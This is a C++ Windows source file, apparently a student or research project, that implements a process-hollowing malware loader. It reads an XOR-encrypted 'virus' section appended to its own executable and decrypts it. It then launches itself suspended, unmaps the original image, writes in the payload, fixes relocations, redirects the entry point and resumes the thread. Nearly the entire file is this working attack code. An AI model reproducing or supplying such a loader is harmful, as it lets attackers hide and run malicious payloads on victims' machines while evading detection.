#include <stdio.h>
#include <Windows.h>
#include <vector>
#include <winternl.h>
using namespace std;

typedef struct DOS_HEADER {             // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // File address of new exe header
} __IMAGE_DOS_HEADER;

typedef struct DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} __IMAGE_DATA_DIRECTORY;

typedef struct FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} __IMAGE_FILE_HEADER;

typedef struct OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} __IMAGE_OPTIONAL_HEADER64;

typedef struct SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        DWORD   PhysicalAddress;
        DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} __IMAGE_SECTION_HEADER;


typedef NTSTATUS(WINAPI* __NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS(WINAPI* __NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);


typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

#pragma warning(disable : 4996)
int main(int argc, char* argv[]) {

    printf("Hello program2\n");

    #pragma region load ntdll and get functions

    HMODULE hNTDLL = LoadLibraryA("ntdll");
    if (!hNTDLL)
        return 1;

    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    if (!fpNtQueryInformationProcess)
        return 1;

    __NtQueryInformationProcess ntQueryInformationProcess = (__NtQueryInformationProcess)fpNtQueryInformationProcess;

    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    if (!fpNtUnmapViewOfSection)
        return 1;

    __NtUnmapViewOfSection NtUnmapViewOfSection = (__NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    #pragma endregion


    #pragma region open running process and get virus section

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    FILE* retrofitting = fopen(path, "rb");

    if (!retrofitting) {
        printf("error opening files\n");
        return 1;
    }

    DOS_HEADER retrofitting_dos_header;
    fread(&retrofitting_dos_header, sizeof(DOS_HEADER), 1, retrofitting);

    FILE_HEADER retrofitting_file_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&retrofitting_file_header, sizeof(FILE_HEADER), 1, retrofitting);
    retrofitting_file_header.NumberOfSections += 1;

    OPTIONAL_HEADER64 retrofitting_optional_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), SEEK_SET);
    fread(&retrofitting_optional_header, sizeof(OPTIONAL_HEADER64), 1, retrofitting);

    SECTION_HEADER virus_section_header;
    DWORD max_virtual_address = 0;
    for (int i = 0; i < retrofitting_file_header.NumberOfSections - 1; i++) {
        SECTION_HEADER section_header;
        fread(&section_header, sizeof(SECTION_HEADER), 1, retrofitting);
        if (section_header.VirtualAddress > max_virtual_address) {
            max_virtual_address = section_header.VirtualAddress;
            virus_section_header = section_header;
        }
    }

    DWORD virus_address = (virus_section_header.VirtualAddress - virus_section_header.VirtualAddress) + virus_section_header.PointerToRawData;
    fseek(retrofitting, virus_address, SEEK_SET);

    // read and decrypt virus byte by byte
    BYTE virus_byte;
    vector<BYTE> virus;
    while (fread(&virus_byte, sizeof(BYTE), 1, retrofitting)) {
        virus_byte = virus_byte ^ 0x40;
        virus.push_back(virus_byte);
    }

    // read virus DOS header from virus
    DOS_HEADER virus_dos_header;
    memcpy(&virus_dos_header, virus.data(), sizeof(DOS_HEADER));

    // read virus into file header from virus
    FILE_HEADER virus_file_header;
    memcpy(&virus_file_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD), sizeof(FILE_HEADER));

    // read virus optional header from virus
    OPTIONAL_HEADER64 virus_optional_header;
    memcpy(&virus_optional_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), sizeof(OPTIONAL_HEADER64));

    vector<SECTION_HEADER> virus_sections;
    for (int i = 0; i < virus_file_header.NumberOfSections; i++) {
        SECTION_HEADER section_header;
        memcpy(&section_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER) + sizeof(OPTIONAL_HEADER64) + (sizeof(SECTION_HEADER) * i), sizeof(SECTION_HEADER));
        virus_sections.push_back(section_header);
    }
    #pragma endregion


    // Create process in suspended form using CreateProcessA
    LPSTARTUPINFOA startup_info = new STARTUPINFOA();
    PROCESS_INFORMATION process_info;
    BOOL result = CreateProcessA(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startup_info, &process_info);

    if (!result) {
        printf("error creating process\n");
        printf("error code: %d\n", GetLastError());
        return 1;
    }

    // get context of retrofitting.exe (ImageBase and OEP)
    LPCONTEXT process_context = new CONTEXT();
    process_context->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(process_info.hThread, process_context)) {
        printf("error getting thread context\n");
        printf("error code: %d\n", GetLastError());
        return 0;
    }

    PVOID image_base_address;
    result = ReadProcessMemory(process_info.hProcess, (PVOID)(process_context->Rdx + (sizeof(ULONGLONG) * 2)), &image_base_address, sizeof(PVOID), NULL);
    if (!result) {
        printf("error reading process memory at PebBaseAddress\n");
        printf("error code: %d\n", GetLastError());
        return 1;
    }

    // Clear space using NtUnmapViewOfSection
    DWORD unmap_result = NtUnmapViewOfSection(process_info.hProcess, image_base_address);
    if (unmap_result) {
        printf("error unmapping view of section\n");
        printf("error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate space using VirtualAllocEx at ImageBase of virus
    PVOID allocated_memory = VirtualAllocEx(process_info.hProcess, image_base_address, virus_optional_header.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocated_memory) {
        printf("error allocating space\n");
        return 1;
    }

    DWORD64 base_offset = (DWORD64)image_base_address - virus_optional_header.ImageBase;
    virus_optional_header.ImageBase = (DWORD64)image_base_address;
    memcpy(&virus[virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER)], &virus_optional_header, sizeof(OPTIONAL_HEADER64));

    result = WriteProcessMemory(process_info.hProcess, image_base_address, virus.data(), virus_optional_header.SizeOfHeaders, 0);
    if (!result) {
        printf("error writing process memory - headers\n");
        printf("error code: %d\n", GetLastError());
		return 1;
    }

    // If successful stretch vrius and copy into space using WriteProcessMemory
    for (int i = 0; i < virus_file_header.NumberOfSections; i++)
    {
        PVOID section_dest = (PVOID)((DWORD_PTR)image_base_address + virus_sections[i].VirtualAddress);
        vector<BYTE> section_data;
        section_data.resize(virus_sections[i].SizeOfRawData);
        memcpy(section_data.data(), &virus[virus_sections[i].PointerToRawData], virus_sections[i].SizeOfRawData);

        result = WriteProcessMemory(process_info.hProcess, section_dest, section_data.data(), virus_sections[i].SizeOfRawData, 0);
        if (!result) {
            printf("error writing process memory - section %d\n", i);
            printf("error code: %d\n", GetLastError());
            return 1;
        }
    }

    if (base_offset)
        for (int i = 0; i < virus_file_header.NumberOfSections; i++)
        {
            char section_name[] = ".reloc";

            if (memcmp(virus_sections[i].Name, section_name, strlen(section_name))) {
                continue;
            }

            DWORD reloc_address = virus_sections[i].PointerToRawData;
            DATA_DIRECTORY reloc_data = virus_optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            DWORD offset = 0;
            while (offset < reloc_data.Size)
            {
                PBASE_RELOCATION_BLOCK block_header = (PBASE_RELOCATION_BLOCK)&virus[reloc_address + offset];

                offset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD entry_count = (block_header->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

                PBASE_RELOCATION_ENTRY blocks = (PBASE_RELOCATION_ENTRY)&virus[reloc_address + offset];

                for (DWORD j = 0; j < entry_count; j++)
                {
                    offset += sizeof(BASE_RELOCATION_ENTRY);

                    if (blocks[j].Type == 0)
                        continue;

                    DWORD field_address = block_header->PageAddress + blocks[j].Offset;

                    DWORD64 buffer = 0;
                    ReadProcessMemory(process_info.hProcess, (PVOID)((DWORD64)image_base_address + field_address), &buffer, sizeof(PVOID),0);
                    buffer += base_offset;

                    result = WriteProcessMemory(process_info.hProcess,(PVOID)((DWORD64)image_base_address + field_address),&buffer,sizeof(PVOID),0);
                    if (!result)
                    {
                        printf("error writing memory - relocations\n");
                        printf("error code: %d\r\n", GetLastError());
                        continue;
                    }
                }
            }
        }


    WriteProcessMemory(process_info.hProcess, (PVOID)(process_context->Rdx + (sizeof(ULONGLONG) * 2)), &virus_optional_header.ImageBase, sizeof(PVOID), NULL);

    // Write The New Entrypoint
    DWORD64 EntryPoint = (DWORD64)((LPBYTE)allocated_memory + virus_optional_header.AddressOfEntryPoint);
    process_context->Rcx = EntryPoint;

    if (!SetThreadContext(process_info.hThread, process_context)) {
        printf("Error setting context\n");
        return 0;
    }

    if (!ResumeThread(process_info.hThread)) {
        printf("Error resuming thread\n");
        return 0;
    }

    fclose(retrofitting);

    return 0;
}

